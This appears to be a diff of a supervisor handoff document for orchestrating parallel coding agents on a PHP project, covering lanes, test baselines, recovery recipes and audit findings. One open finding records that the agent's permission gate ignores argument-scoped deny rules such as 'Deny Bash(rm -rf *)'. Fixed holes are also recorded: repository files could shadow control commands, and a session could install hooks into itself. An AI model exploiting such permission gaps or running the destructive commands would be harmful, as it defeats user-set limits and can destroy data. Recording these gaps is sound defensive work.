-  they are supervisor-owned — and they go stale the moment that commit lands):
-  `crush_code.md:1607` reasons from "`contextWindow()` correctly reports 196,608";
-  `crush_code.md:2530` quotes the old `config.dev.json`; `crush_feat.md:1857` still describes the
-  deployment as MiniMax. Fix all three AFTER the commit lands, not before — until then the tree does
-  not yet say what they would be corrected to.
-
-- **Follow-up deliberately deferred, and STILL deferred.** `src/Config/LayeredSettings.php` landed
-  in `f0585149`, but round 31's lane `cmd` is now extending `LAYERED_KEYS` again for P6.3/P6.4. Add
-  reasoning-effort to `LAYERED_KEYS` only after THAT lands, or two lanes rewrite the same constant.
-
-### What landed this round
-
-| commit | what |
-|---|---|
-| `8d15443c` | **Phase 7 items 3-6** — ten pages under `sugar-crush/docs/`, 2,691 lines, zero `.php` |
-| `6b63022e` | Phase 7 marked complete; the docs review's five defects recorded |
-| `1308a1d1` | the `WorktreeManager` fatal + the plan's wrong key list |
-| `35f3c1ac` | the permission-matcher hole and five more docs-lane findings |
-
-### OPEN FINDINGS worth picking up (all in `crush_code.md`, measured, none fixed)
-
-1. 🔴 **Argument-scoped permission rules match NOTHING.** `PermissionGate::ruleMatches()`
-   (`:209-220`) compares only `ToolCall::$name`. `Deny Bash(rm -rf *)` computes prefix
-   `Bash(rm -rf ` → `str_starts_with('Bash', …)` false → **never fires**. `PermissionRule.php:9`
-   advertises exactly that syntax. A user who writes an argument-scoped deny has denied nothing.
-2. 🔴 Prefix matching on the **real-call** path is pinned by no test (only the declaration path).
-3. 🟡 `WorkflowEngine` never resolves `agent:` to a preset — fabricates `new Agent(name, prompt:'')`;
-   `executeStage()` runs `$tasks[0]` only; `pipeline`/`withVerification` have no YAML spelling.
-4. 🟡 5 of 9 skill frontmatter keys inert; `App::dispatchSkill()`/`applySkillsToSystemPrompt()` have
-   no caller, so `context: fork` does nothing on the CLI path.
-5. 🟡 `agentRoster()` drops 10 of 16 preset fields incl. `permissionMode`.
-6. 🟡 `HookManager.php:34`'s worked example names `confirm-remove`; the hook is **`confirm-rm`**, so
-   the example names a hook the guard does not protect. Guard keys by **event+name**.
-7. 🟡 `CONTROL_PLANE` reserves a `/permissions` command with no row and no dispatch arm.
-
-### QUEUE
-
-1. **P3.x** in `lane-lsp` — TextInput, candy-focus FocusRing, candy-sprinkles Table, candy-kit help
-   screen. Needs **no new `src/` file**, so it will not collide with the census literals `lane-cmd`
-   already moved (278→279). **Sequence it AFTER `lane-sglang` lands** — both touch `src/Chat.php`.
-2. **P6.3/5 and P6.4/6** — the 4-deep chain behind P6.1/2, serial in `Bootstrap.php`.
-3. The open findings above, especially #1.
-4. **P8.6** (VHS demos), P8.4, P8.8, P8.9/10/11, P8.13.
-5. **Phase 2 item 9** (plugins) LAST, then the hardening backlog E1-E50.
-
-**Do not exceed the lane count the user set.** They asked for **2 concurrent plan lanes**; the third
-(`lane-sglang`) exists because they explicitly requested that task. Four would exceed what they
-authorised.
-
-
-## SUPERSEDED — the 2026-08-20 compact block. NOT "read this first"; §0-NOW-56 is. Kept for its reasoning.
-
-**HEAD is `a2221578`, tree CLEAN, in sync with `origin/master` (0 ahead / 0 behind).**
-**Suite baseline: `7782 tests / 90237 assertions / 1 skipped / rc 0`, ~3m12s** — supervisor-measured
-in the live tree, against local sibling symlinks. **Skips MUST stay 1.** A 2 means
-`vendor/sugarcraft/*` got replaced by Packagist copies and every figure since is void. The one
-legitimate skip is `tests/MCP/McpClientTest.php:106`.
-
-`sugar-crush/vendor/sugarcraft/` now has **18** symlinks, not 16 — see the dependency note below.
-
-### FAN-OUT IS CURRENTLY **ON**, AT 2 LANES
-
-The user asked for 2 concurrent lanes (their words: *"do the fan out but go with 2 concurrent lanes
-not 3 for now"*), and said they will say when to change it. `docs/plans/crush_code_concurrency.md`
-is the authority for the mechanics; §0b below is the summary.
-
-**Workflow `wo6lx5vcd` (run id `wf_4ee49ce4-130`) is RUNNING**, two lanes in parallel, each
-implement → review → fix:
-
-| lane dir | bundle | scope |
-|---|---|---|
-| `/home/sites/crush-lane-cmd` | **C4b** | the rest of Phase 2 item 4 — the `` !`cmd` `` and `@file` template forms |
-| `/home/sites/crush-lane-lsp` | **C6** | Phase 2 item 7 — WRITE `src/Tools/LspTool.php` (the plan wrongly says "add `implements Tool`"; no such class exists) |
-
-Both lanes were snapshotted from a verified-quiescent tree at `a2221578` and each carries a
-`.lane-provenance` file recording source HEAD, a `git status` hash and the timestamp. Both verified:
-18 symlinks, 0 broken, `ReflectionClass` resolving INSIDE the lane.
-
-**THE COMMIT GATE IS DIFFERENT IN FAN-OUT MODE — this is a deliberate change, not drift.** In solo
-mode the supervisor ran the suite and committed. In fan-out the user's design is that each lane
-commits and pushes to `master` from its own copy, so **the lanes commit themselves**, gated on: full
-suite green in-lane with skipped == 1, `check-path-repos --no-lib-path-repos` rc 0, config md5
-unchanged, no `.vhs/*.gif` and no `composer.lock` staged, and `git pull --rebase origin master`
-before every push. The supervisor's remaining job is the POST-hoc gate: pull into
-`/home/sites/sugarcraft` and run the full suite there.
-
-**The LSP lane holds the CENSUS TOKEN this round.** It is adding a `src/*.php` file; the cmd lane was
-explicitly forbidden from adding one. Two lanes both bumping `assertSame(278, …)` merges CLEANLY and
-is silently wrong — that is the sharpest conflict class in the map.
-
-### IF THE WORKFLOW RESULT IS LOST TO A COMPACT
-
-The lanes are **independent git repositories**, so recovery is different from solo mode:
-
-```sh
-for L in /home/sites/crush-lane-cmd /home/sites/crush-lane-lsp; do
-  echo "=== $L ==="; cat $L/.lane-provenance
-  git -C $L log --oneline -3          # did it commit?
-  git -C $L status --short            # or is the work still uncommitted?
-  git -C $L rev-list --left-right --count HEAD...origin/master   # did it push?
-done
-```
-A lane that committed AND pushed needs nothing but a `git pull` in the live tree. A lane that
-committed but did not push: push it. A lane with uncommitted work: that work is still there — verify
-and commit it. Lanes are disposable once their work is on `origin/master`; `rm -rf` them then.
-
-### PLAN ITEMS: 49 of 75 done, 26 left
-
-`a4be8263` closed **Phase 4 item 6** (real subcommands `doctor`/`models`/`session`/`mcp`/`completion`,
-`--config <file>`, and a validated `--output-format` that no longer degrades silently to text at
-exit 0). **Phase 2 item 4 is HALF done and is NOT in the 49** — the `CommandLoader` wiring and
-`$ARGUMENTS`/`$1..$9` landed; `` !`cmd` `` and `@file` are what lane C4b is doing now.
-
-Phases 0, 1, 5 complete. Phase 2 items 1, 2, 3, 5, 6, 8 complete.
-
-### A SUPERVISOR-ONLY ACTION THAT ALREADY HAPPENED — `ddd9560d`
-
-**`candy-focus` and `candy-kit` are now in `sugar-crush/composer.json`.** They were NOT dependencies,
-so Phase 3 item 2 (candy-focus `FocusRing` for pane cycling) and Phase 3 item 5b (restyle the help
-screen with candy-kit) were literally unimplementable by an agent — closing the gap needs a `require`
-bump plus `composer update`, which every agent is forbidden to run. Measured: no OTHER dependency is
-missing. Three namespaces looked absent (`Bits`, `Charts`, `Query`) but all three appear only inside
-`src/Skills/BuiltIn/*/SKILL.md` documentation, never in code; `Pty` is correctly `require-dev`.
-
-If you ever repeat this: add the `require` lines, snapshot the manifest, `check-path-repos --fix
---strict-closure`, `composer update`, `git checkout -- '*/composer.json'`, restore the snapshot, and
-verify `--no-lib-path-repos` exits 0 and the manifest has no `repositories[]` block.
-
-### TWO SECURITY-RELEVANT FIXES LANDED IN `a4be8263` — do not "re-find" them
-
-Both were found by review rounds, not by the implementers' green suites, and both are functionality
-class under §3 (data loss / losing control of `/exit`), so they were fixed now rather than deferred:
-
-1. **`doctor` DELETED STORED CONVERSATIONS** — its probe reached the session store through the
-   pruning accessor. Fixed with a `Bootstrap::sessionStore(bool $prune = true)` seam; the launch path
-   is byte-identical.
-2. **Repository content could SHADOW CONTROL BUILT-INS**, `/exit` and `/permissions` included — a
-   checked-in `.sugar-crush/commands/exit.md` was enough. Fixed in the LOADER (not in `Chat`), so the
-   popup, `/help` and dispatch read one already-reserved `CommandRegistry::CONTROL_PLANE` map instead
-   of three that agree by luck. Non-reserved built-ins (`compact`, `rewind`, …) stay overridable.
-
-### THE HAZARD DISCOVERED THIS ROUND — read before creating any lane
-
-**Never `cp -a` a tree while an agent is running a mutation harness in it.** The copy freezes whatever
-mutation was applied at that instant. Measured: a probe copy froze
-`'fish' => self::zshCompletion()` where live had `fishCompletion()`, its suite showed 1 failure, and
-the obvious wrong reading was that an unrelated dependency change had broken something. A lane born
-that way reports false mutation kills all round, because a pre-broken test reads as killed.
-
-**Corollary: a still `git status` is NOT evidence of an idle agent.** A mutation loop edits one file,
-runs ONE test file (~0.05s), and restores from a checksummed backup, so the tree sits byte-identical
-for minutes while a great deal happens. Judge liveness from the agent transcript's mtime and from
-`pgrep -af 'bin/phpunit'`. (Beware: `pgrep -c -f 'bin/phpunit'` counts your own pgrep and its shell
-wrapper — check the actual lines, not the count.)
-
-### QUEUE AFTER C4b + C6
-
-C4a/C4b close Phase 2 item 4 · then **P2.1/2** (the McpClient rename, tracker #12) · **P3.x** (now
-unblocked by `ddd9560d`) · **P6.1/2** then the 4-deep chain behind it · **P8.3** (whose halves the
-tracker has BACKWARDS — the render branch is written at `src/Tui/AgentOutputPane.php:58`; what is
-missing is the hand-off, since `BackgroundSupervisor::getStallWarnings()` has no production caller) ·
-Phase 7 docs · **P2.9** (plugins) explicitly LAST · then `#88` · then the hardening backlog E1-E50.
-
-### W3'S TWO KNOWN-OPEN ITEMS (deliberate, recorded, not defects of omission)
-
-1. **A mid-grey crossover band.** Over all 256 greys × 5 palettes, backgrounds around
-   `#6c6c6c`-`#797979` can project two different shell tokens to the SAME colour (14/256 greys on
-   `ansi`, 7/256 on `dracula`). **Legibility is unaffected** — 5 palettes × 24 backgrounds, zero
-   sub-4.5 — so the user's bug stays fixed; what degrades is role DISTINCTION.
-2. **The frame walk ignores SGR 2 (faint)**, which `src/Renderer.php` emits at 17 sites. Dracula's
-   `shellMuted` measures 6.31:1 but is painted at roughly 2.70:1. Left open on purpose: modelling
-   "half-way to the background" would pin a terminal-by-terminal guess as fact.
-
-### AGENT CONTEXT BUDGET — a standing user instruction
-
-**Per-agent context should finish around 200k, not 360k.** The analysis agent that produced the
-concurrency map came in at 190k, which is the shape to aim for. In force: rules live in
-`docs/plans/crush_agent_rules.md` and are read by path, never inlined; agents are told never to read
-`src/Cli/Bootstrap.php` (212 KB) or `src/Chat.php` (~6,100 lines) in full; stages pass reports rather
-than having each agent re-derive; mutations capped at 5-8 with single-FILE test runs while iterating
-and the full suite at most twice.
-
----
-
-## 0b. RUNNING MORE THAN ONE AGENT AT A TIME
-
-**`docs/plans/crush_code_concurrency.md` is the authority.** Read its §0 and §1 and
-nothing else unless you are changing the map. It carries the mode switch (ON, OFF, and
-draining a lane that is mid-flight), the lane table for all 27 remaining items, the
-directory recipe, and the collision rules.
-
-The four things worth knowing without opening it:
-
-1. **The ceiling is `src/Cli/Bootstrap.php`, not the machine.** 11 of the 27 remaining
-   items (41%) must edit it, including the two largest. That is one strictly-serial
-   lane; no lane design shortens it. 5 lanes defined, sustainable N = 3, hard cap 4.
-   Concurrency buys the other 16 items running alongside — it does NOT give 3× throughput.
-2. **Isolation = `cp -a` of the WHOLE repo**, never `sugar-crush/` alone. Measured: in a
-   whole-repo copy all 16 `vendor/sugarcraft/*` symlinks resolve INSIDE the copy with
-   zero repointing, the copy is a real git repo that can push, and a lane can safely edit
-   a sibling lib. **This supersedes §7 below for full-repo lanes** — repointing there is
-   not merely unnecessary, it IS the isolation bug. §7 remains correct for the lib-only
-   sandbox it was written about. `git worktree` is ruled out: git refuses the same branch
-   in two worktrees, and every lane must be on `master`.
-3. **The census token.** The one collision that merges CLEANLY and is silently wrong: two
-   lanes each adding a `src/*.php` file both edit `assertSame(277, …)` → `278`; git sees
-   identical text, auto-merges, and leaves 278 when the truth is 279. One holder at a
-   time. 5 of the 27 items add a source file.
-4. **No lane ever commits a `.vhs/*.gif`.** CI regenerates and pushes them after every
-   batch of changes, so master drift is guaranteed, not occasional. Since GIFs are binary
-   a rebase conflict there is not hand-mergeable — and since no lane writes them, it can
-   never happen. `git pull --rebase` before every push is routine, not defensive.
-
-## 1. The standing directive
-
-**Run the plan to 100% without pausing.** Do not stop at phase boundaries to report
-and wait. After committing a bundle, immediately brief and spawn the next one in the
-same turn. Reporting progress is fine; *ending the turn to await approval* is not.
-
-Stop only for (a) a decision genuinely the user's that cannot be resolved from the
-request, the code, or a sensible default, or (b) an explicit instruction to pause.
-
-Stated 2026-08-18: *"do not stop anymore keep going until the plan is 100% completed
-unless you cannot proceed further without a decision from me or i told you to pause"*.
-
-## 2. The loop — every bundle, no exceptions
-
-1. **Implement** — spawn an agent with a brief carrying the ground truth you measured
-   yourself (never the plan's line numbers; see §5).
-2. **Review** — spawn a **separate** adversarial agent on the diff. Never the same
-   agent, never skip this.
-3. **Fix** — spawn a fix agent with the findings.
-4. **Verify** — the *supervisor* runs the full suite personally. Do not trust an
-   agent's reported totals.
-5. **Commit** direct to `master`. No branches, no PRs.
-
-"Don't pause" means don't stop *between* rounds, not skip rounds.
+## APPENDIX IV — ENVIRONMENT & PHILOSOPHY (legacy §§3–8, unchanged; state claims in them froze and are
+## superseded by §0-NOW-71 — the rules and facts are the durable part)
 
 ## 3. Sequencing rules
 
@@ -5706,7 +686,7 @@ a run. Judge a mutation by whether the **targeted test file** flips green→red 
   freely for mutation loops; only the FINAL green/red judgement needs the full configured run.
 - `tests/Cli/BootstrapSkillSkipsTest.php` run **alone** is rc=1 (`OK, but there were issues!
   Risky: 2`) on a clean tree and contributes 0 risky in the full suite — order-dependent,
-  pre-existing, backlog **E36**. Do not chase it as a regression.
+  pre-existing, backlog **E36**. Do not chase it as a regression. (round-68 lane ec ruled E36 CLOSED/not-reproducible — still: don't chase, don't gate on it).
 - **Six test files did not clear the backend-selection env chain** until `6bc5218b`; with
   either shell-out variable ambient the suite showed 1 error + 10 failures. Now handled by
   `tests/Support/BackendSelectionEnvSandboxTrait.php`, which holds the chain ONCE. If you add
@@ -5738,159 +718,415 @@ a run. Judge a mutation by whether the **targeted test file** flips green→red 
   working as intended — but it means the prose figures ("500ms doubling, ~1.5s total") have
   no reader and will rot silently if the constant moves.
 
-## 9. The plan lies about its own state — verify, don't trust
 
-Corrected so far (all measured): every §12 line number is stale · §12's drafted text
-for `Grep`/`Glob` would have *regressed* them by deleting guidance Phase 8 item 7
-added · §12's `dispatchSkill()` fix does not compile (`App` has no
-`environmentBlock`) · §12 asserts Grep is POSIX ERE — **it is GNU BRE** · lane D
-F3–F7 already landed in `dad90b18` · the `Write` tool and `TerminalBackground::observe()`
-are already wired · `StallDetector`'s call-site half is done and it is **not** blocked
-on Phase 1 · `KEY_HELP_COLS` is 64, not the 58 the backlog claimed · tracker numbers
-#83 and #85 each denote two different findings · #88's figure has eight successive
-measurements, so re-measure it *after* a round lands, never before. · Phase 5 item 7's
-"feed it from `AssistantMsg` usage data already flowing through `EngineBackend`/`Runtime`"
-is false — usage dies at two seams: `Runtime::runBatch()` yields
-`new AssistantMessage($content, $toolCalls, $reasoning)` and `Backend::complete()`
-returns a `Message`, neither of which has any usage field, and
-`grep tokensUsed src/Backend/EngineBackend.php` is empty. There are **three** seams,
-not two — `completeAsync()`'s fork unserializes with `allowed_classes => false`. ·
-Three providers compute an input/output split, not one: Bedrock, Vertex, **and**
-`OpenAIProvider::calculateCost()`, which prices both halves and then reports only the
-total. · `VertexProvider`'s *stream* emits the two halves as separate responses, so
-streamed usage must be **summed**, not read off the last chunk — and that file's own
-`completeStream()` docblock said the opposite. · **Phase 5 item 8 names a harmful
-location**: `EngineBackend::runCompleteInChild()` wraps the whole agentic loop, so a
-retry there replays every tool call the failed attempt already executed. The seam is
-the four single-provider call sites (`Runtime::runBatch`/`runStreaming`,
-`AgentManager::executeSubAgent`'s two branches). §10 recommendations 5 and 8 carry the
-same instruction and are now marked ⚠ SUPERSEDED. · **Phase 5 item 9's
-`MemoryStore::search()` route does not work**: `search()` is a case-insensitive
-SUBSTRING match over content/type/tags across every scope, so a whole turn as the query
-matches essentially nothing — recall built that way is permanently empty while looking
-wired. · **Phase 5 item 10a's "additional working directories" line has no data
-source** — zero hits for any multi-root concept in `src/`; the prerequisite is a
-settings key plus a multi-root `PathJail` (backlog E26). · `MemoryScope::Local`
-normalises to the on-disk scope **`agent`**, so the enum values are not the directory
-names.
+---
 
-**Phase 2 measured 2026-08-19 (supervisor, read-only probes) — two queue items were
-already done and one names a class that does not exist:**
+## APPENDIX V — CRAFT-RULES DIGEST
 
-- **Item 3 (`WorkflowEngine`/`WorkflowRegistry` in `Bootstrap::chat()`) is DONE.**
-  `src/Cli/Bootstrap.php:374` passes `workflowEngine: self::workflowEngine($root, $permissionGate)`,
-  and that factory (~390) deliberately uses `trustedConfigDirPath()` rather than
-  `configDirPath()` because `WorkflowRegistry::load()` reaches a `.php` workflow through
-  `require` — a directory whose contents get EXECUTED. Nothing to do.
-- **Item 5 (`HookManager::loadFromFile()` in `Bootstrap::hooks()`) is DONE, and better
-  than the plan's instruction.** `Bootstrap::hooks()` (1569-1599) calls
-  `registerBuiltIns()` and then `loadEntries(self::hookFileEntries($path), $path)` per
-  candidate file, fail-closed into `PermissionConfigException`, deduplicated by realpath,
-  with an unreachable-ancestor refusal and a per-project trust opt-in. It does NOT call
-  `HookManager::loadFromFile()` directly, on purpose: entries are read ONCE PER PROCESS
-  so a session cannot install hooks into itself mid-session (a `>> ~/.sugar-crush/hooks.yaml`
-  plus a Ctrl+P provider switch used to do exactly that). The plan's literal instruction
-  would re-read the file on every hook-manager build and reopen that hole.
-  Its stated prerequisite is also genuinely satisfied: `df0a563b` really is Phase 1
-  item 2, and `ScriptHook::EXIT_ASK = 3` / `EXIT_MODIFY = 4` exist.
-- **Item 7 names `LspTool`, which does not exist.** There is no `src/Tools/LspTool.php`.
-  What exists is `src/LSP/` — `LspClient`, `LspConnection(Interface)`, `LspCache(Interface)`,
-  `LspResponse`, and two exception types. So item 7 is "write the tool", not "add
-  `implements Tool`" to something.
-- **Item 4's own source confirms it is unwired**, so the queue entry is right for once:
-  `src/Commands/CommandLoader.php`'s class docblock says "NOT YET REACHABLE FROM
-  bin/sugarcrush: nothing constructs a CommandLoader in production yet" and defers the
-  `$ARGUMENTS`/`$1`/`` !`cmd` ``/`@file` substitution. That docblock also claims
-  `src/Chat.php` "is owned by a concurrent track" — stale prose to fix when item 4 lands.
-- **Item 8 (`CommandBackend` → `StreamingCommandBackend`) is HARMFUL AS WRITTEN.** Full
-  measurement in `/tmp/…/scratchpad/c1-measured.md`; the short form: both classes take
-  `string|array` and receive the identical stdin payload, but `StreamingCommandBackend::complete()`
-  does `rtrim($line, "\r\n")`, drops empty lines, and `implode('', $tokens)` — so the
-  wrapper `CommandBackend`'s own docblock recommends (`curl … | jq -r '.content[0].text'`)
-  comes back as one run-on line with every newline and blank line deleted. It also carries
-  a blanket `$timeout = 120` total-request cap (against the standing directive) whose
-  expiry message reports ITERATIONS where the user configured SECONDS, and a no-op
-  ternary `is_array($this->command) ? $this->command : $this->command`. The two output
-  protocols are mutually exclusive; wire the dormant seam behind its own opt-in instead of
-  swapping the existing one.
-- **Item 1's "duplicate `McpClient`" is a BASENAME collision, not a PSR-4 one.**
-  `SugarCraft\Crush\McpClient` (stdio/JSON-RPC to Claude Code) and
-  `SugarCraft\Crush\MCP\McpClient` (Guzzle HTTP) coexist legally. The rename is still
-  worth doing — it is what disambiguates `tests/McpClientTest.php` from
-  `tests/MCP/McpClientTest.php`, which has already caused one mis-citation of the single
-  legitimate skip. The root class has **no `src/`, `bin/` or `examples/` call sites**; it is
-  a dormant seam reached only from its own test.
+Every rule below is lifted VERBATIM from the round-32…round-61 history blocks trimmed 2026-09-12
+(items 27–28, 38, 40–43, 45–46 of the adjudication, plus the recommended final imperative-mood sweep of
+old lines 2226–5400). Cited line numbers are positions in the pre-trim file (git ancestry).
 
-## 10. Current state and the queue
+### (a) E452 recovery — if the round is killed, do NOT use resumeFromRunId
+*(was §0-NOW-55, lines 2027–2049)*
 
-> 🔴 **STALE — FROZEN 2026-08-19. Superseded by §0-NOW-62 §5 and §8.** Its "48 of 75 plan items,
-> 27 left" is wrong in both directions: the plan has 82 items, ~76 are done, and **six** are open.
-> Its instruction to read `crush_code.md`'s "Execution status" block is also spent — that block
-> froze at round 32/40 and under-states its own progress by twelve items, measured. Kept for the
-> `#N`-tracker reasoning below, which is still the right warning about totals.
+### 🔴 IF THE ROUND IS KILLED, DO NOT USE `resumeFromRunId` — SEE E452
 
-**Current state: see the "Execution status" block at the top of `crush_code.md`** for
-what is complete, and §11 below for what is next. Verify the suite yourself before
-believing any number written anywhere.
+Resume replays the longest unchanged PREFIX of `agent()` calls, and under `pipeline()` the call order is
+set by completion times, so the prefix cannot be reproduced. Measured this round: it replayed the three
+implements from cache and then started three REVIEW agents, including one for a lane whose fix had
+already landed.
 
-**CURRENT STATE, 2026-08-19.** Last CODE commit is **`47ee2c86`** (bundle W1, the user's live render
-bug — long replies wrap instead of being cut, and pane width is now an invariant). Before it,
-**`3b0ba8fe`** (bundle C3, MCP tools behind a trust gate). Supervisor-verified **7577 / 87648 / 1,
-exit 0** against LOCAL sibling symlinks. **A 2-skip run means you are not testing the monorepo** — see
-the vendor section below.
+**The recovery that works:** read the round script as text, truncate at its `phase('Implement')` line,
+rewrite `export const meta` → `const meta`, `require()` it, and call the real `fixPrompt` with the cached
+stage results pulled out of `journal.jsonl`. That regenerates each prompt byte-identically (verified at
+53,445 and 51,840 chars). Emit only the missing agents into a fresh script and leave completed lanes
+alone. Preserve any uncommitted work with `git stash create` + `git update-ref refs/rescue/<tag>`, which
+snapshots into git WITHOUT committing red and WITHOUT disturbing the working tree.
 
-**Bundle W2 is IN FLIGHT** (input blocked while a turn runs, user-reported). Nothing of it is
-committed.
+**The recipe was dry-run against round 55's own script on 2026-08-25, while the round was healthy and
+nothing needed recovering** — a known-positive control (rules 15/25), because a recovery tool is exactly
+the kind of instrument you cannot test at the moment you need it. It works: the truncate-and-`require`
+step exports `fixPrompt`, `reviewPrompt`, `implementPrompt`, `LANES`, `COMMON`, `BASE`, `ROUND`, and
+`fixPrompt(review, LANES[0], impl)` renders 23,995 chars with both stage results interpolated. Two things
+to know before you run it: the lane objects key on **`key`**, not `id` (`LANES.map(l => l.key)` → `abc`),
+and the script only parses if you wrap it — `node --check` on a workflow script fails with "await is only
+valid in async functions", which is expected, since the body runs in an async context. Wrap it in
+`async function __w(){ … }` and rewrite the trailing `return` before you check it.
 
-**Phase 2 items 1, 2, 3, 5, 6, 8 complete. Phases 0, 1 complete. PHASE 5 IS COMPLETE** —
-item 10b was measured 2026-08-19 and found already done by Bundle A (`bf3495f5`); see
-"BUNDLE B4 NEEDED NO CODE" below before re-planning it.
-**48 of 75 plan items, 27 left.** See the `#N`-tracker section below before answering any question
-about totals — the answer is not the sum of the series.
+### (b) /tmp does not survive a reboot; predecessor scratchpad files
+*(was §0-NOW-55, lines 2051–2055 — pairs with rule 10's evidence path)*
 
-## BUNDLE W1 IS COMMITTED — `47ee2c86`. The user's live render bug is fixed.
+🔴 **`/tmp` DOES NOT SURVIVE A REBOOT.** Everything under `~/.claude` did — lane commits, the round
+script, the journal, per-agent transcripts. `/tmp` took the staged sweep script and every lane
+scratchpad. Anything a round needs across a reboot belongs in git or under `~/.claude`. Note also that a
+relaunched agent can find a PREDECESSOR's files in its scratchpad namespace (E427 spanning a kill), so a
+bare `out.txt` read or an `until grep -q` wait there can be satisfied by work that is not yours.
 
-**A user bug report that jumps the audit queue**, because frame corruption counts as functionality
-under §3. Reported while daily-driving: long assistant lines "not wrapped but cut off", then a blank
-line, then unrelated content.
+### (c) on ANY stage failure, git log <base>..HEAD in that lane BEFORE re-running
+*(was §0-NOW-53, lines 2179–2185 (E393))*
 
-**Four rounds: implement → review → fix A → fix B, then commit.** Supervisor-verified at every
-gate. Final: **`Tests: 7577, Assertions: 87648, Skipped: 1`, rc=0, 3m01s** (entry baseline was
-7387 / 76813 / 1). `Renderer.php` +457/-7 plus `tests/Renderer/PaneWidthInvariantTest.php` (187 tests,
-10,773 assertions). Full round-by-round detail is in the worklog.
+### 🔴 LANE A's FIX STAGE "FAILED" AND HAD ALREADY DONE THE WORK — SEE E393
 
-**Twelve of twelve mutations killed, each RE-VERIFIED BY ME with my own edits** — which is the whole
-reason this bundle is trustworthy, see the next section.
+`fix:a-core-fd` died on `403 Unable to verify organization membership` **after** applying every review
+finding and committing four times. Re-running the stage — one `resumeFromRunId` call away — would have
+handed a fresh agent an already-fixed tree and a findings list describing defects that no longer existed.
+**On ANY stage failure, `git log <base>..HEAD` in that lane BEFORE deciding what to re-run.** Third
+occurrence of "harness loses the report, work survives", third different proximate cause.
 
-**MY DIAGNOSIS WAS WRONG ABOUT THE MECHANISM — now CONFIRMED wrong by the review round.** I wrote
-that the terminal soft-wraps the over-wide row and candy-core's absolute `cursorTo()` paints later
-rows at stale coordinates. The implementer reports the hosted path never emits an over-wide row at
-all: `ChatPane.php` wraps the body in `Style::new()->width($width)` and candy-sprinkles' `width()`
-TRUNCATES (`candy-sprinkles/src/Style.php:1000-1004`, `Width::truncateAnsi`), with
-`Tui/Renderer.php:394` clipping the composed frame. My 204-column measurement was real but taken
-against standalone `Chat::view()` — a number written next to the wrong domain, §5 again, in the brief
-whose whole job was ground truth. **The user's own words were "cut off", which IS truncation; I
-replaced an accurate description with a theory.** The fix is the same either way, which is the only
-reason it cost nothing.
+### (g) RULE 33 — guard offers an exemption row: ask first whether the code is correct
+*(was §0-NOW-54, lines 2101–2106)*
 
-**The absence that let it ship: no test among 7,387 measured row width against the terminal.** Proven,
-not asserted — with the src change alone and the new file absent, the suite came out byte-identical to
-baseline. Not one test rendered prose long enough to wrap at its fixture width.
+🔴 **NEW STANDING RULE 33: WHEN A GUARD OFFERS YOU AN EXEMPTION ROW, ASK FIRST WHETHER THE CODE IS
+CORRECT — IF IT IS, THE CLASSIFIER IS THE DEFECT.** The guard's failure text offered two blessed
+resolutions (name the fds, or add an `ACCOUNTED_FOR` row). Both were wrong here. An exemption row written
+for correct code is where the next real offender hides. The classifier learned the rule instead, keyed by
+depth and pinned in BOTH polarities: closer in `finally` → short; closer in `if` inside `finally` →
+unclassified; closer in `finally` inside a `foreach` → unclassified. Dropping the new arm reds 2 tests.
 
-## ⚠️ THE LESSON FROM W1 THAT MUST SURVIVE INTO EVERY LATER BUNDLE
+### (d) check git branch and git reflog before believing a lane lost anything
+*(was round-49 block, lines 2395–2397)*
+
+🔴 **Check `git branch` and `git reflog` before believing a lane lost anything**, and inspect a dirty tree
+before reverting it — in this round two dirty trees were probes and two were real work, and only reading
+the diffs told them apart.
+
+### (e) commit before measuring; commit before mutating
+*(was round-48/47 blocks, lines 2399–2401 and 2549–2553)*
+
+**A `cd` followed by a relative path destroyed a file twice this session** (once `NonInteractive.php`, once
+an over-greedy regex across two test files). Both were fully recoverable **only because the work was
+committed first.** Commit before measuring; commit before mutating.
+
+
+
+🔴 **A supervisor mutation must assert its own address before writing.** At this merge, `sed -i
+"${L}s|.*|…|"` ran with `$L` EMPTY — the address vanished and the substitution hit **every line of
+`src/Cli/NonInteractive.php`**, destroying the file. Recovered completely by `git checkout --` only
+because the merge had been committed first. **Commit before mutating, and compute the target with a
+`assert len(hits)==1` guard rather than a shell variable that can be empty.**
+
+### (f) re-derive HEAD before believing any sha in a review or brief (E190 fix-agent rule)
+*(was round-46 block, lines 2696–2700)*
+
+E168 covers the agent that dies mid-MUTATION leaving dirt. **This is the agent that dies mid-REPORT
+leaving committed work nobody has been told about.** The replacement handled it correctly without being
+told to. **Put it in the fix-agent brief:** re-derive HEAD with `git log --oneline <base>..HEAD` before
+believing any sha in the review or the brief; if commits exist the review does not mention, verify them by
+mutation, do not redo them, and say so.
+
+### (h) SALVAGE (unverified) wording discipline — dirty lane vs mutation
+*(was round-47 block, lines 2595–2597)*
+
+**The distinguishing test:** a mutation is incoherent on its face and sits in a file the lane does not own;
+in-progress work is coherent and on-target. Commit it as `SALVAGE (unverified)`, saying plainly that the
+supervisor committed it and that nothing about it has been checked.
+
+### (i) E80 flake signature — re-run before diagnosing
+*(was round-44/42 blocks, lines 3055–3057 and 3605–3610)*
+
+`MultiAgentRefactorTest::testArchitectPlansTwoCodersImplementInParallelReviewerVerifiesLeadMerges` —
+`pcntl_fork()` + SQLite `flock()` with a **capped** backoff. **If a full-suite run comes back rc 1 with
+exactly one risky test and ~22 missing assertions, this is it — re-run before diagnosing anything else.**
+
+
+
+🔴 **E80 IS A REAL FLAKE AND IT WILL BITE A FUTURE ROUND.**
+`MultiAgentRefactorTest::testArchitectPlansTwoCodersImplementInParallelReviewerVerifiesLeadMerges`
+aborted at 60 s on one run and passed on the next, same tree, nothing between them but machine load —
+`pcntl_fork()` + SQLite `flock()` with a **capped** backoff. It did not fire in the merged run. **If a
+future full-suite run comes back rc 1 with exactly one risky test and ~22 missing assertions, this is
+it — re-run before diagnosing anything else.**
+
+### (j) PHPUnit 10 counts …OrEqual as 2 assertions — ask what a delta PINS, never what it totals
+*(was round-34/37 blocks, lines 4782–4809 and 3886)*
+
+⚠️ **Assertion totals are NOT assert-call counts** — PHPUnit 10 counts the `…OrEqual` family as 2.
+
+
+
+### ⚠️ THE ASSERTION TOTAL IS NOT COUNTING ASSERT CALLS — supervisor-verified
+
+Every round of this plan quotes `tests / assertions` as its health figure. **PHPUnit 10 counts
+`assertLessThanOrEqual()` and `assertGreaterThanOrEqual()` as TWO assertions each** (they are
+composite `LogicalOr` constraints). Supervisor-verified directly, with a four-method probe run
+against `sugar-crush/vendor/bin/phpunit`:
+
+```
+assertSame              -> OK (1 test, 1 assertion)
+assertLessThanOrEqual   -> OK (1 test, 2 assertions)
